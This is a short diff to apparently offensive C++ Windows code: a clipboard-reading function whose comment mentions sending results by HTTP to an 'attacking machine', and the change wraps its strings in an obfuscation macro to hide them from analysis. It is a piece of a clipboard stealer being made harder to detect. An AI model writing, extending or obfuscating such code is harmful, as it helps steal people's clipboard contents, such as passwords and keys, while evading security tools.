@@ -1,6 +1,7 @@
 #include <string>
 #include <windows.h>
 #include <tools.h>
+#include <obfstr.h>
 
 // Extracting in UTF_16 format, Windows console could not show it properly
 // TODO test if final result after HTTP call to attacking machine is correctly formatted for all symbols
@@ -8,7 +9,7 @@ std::string GetClipboardText()
 {
     if(!OpenClipboard(nullptr))
     {
-        return "Failed. Clipboard is not open.";
+        return OBFSTR("Failed. Clipboard is not open.");
     }
 
     HANDLE hData = GetClipboardData(CF_UNICODETEXT);
@@ -17,7 +18,7 @@ std::string GetClipboardText()
     if(textArray == nullptr)
     {
         CloseClipboard();
-        return "Failed. Cannot lock clipboard memory location.";
+        return OBFSTR("Failed. Cannot lock clipboard memory location.");
     }
 
     std::wstring text(textArray);
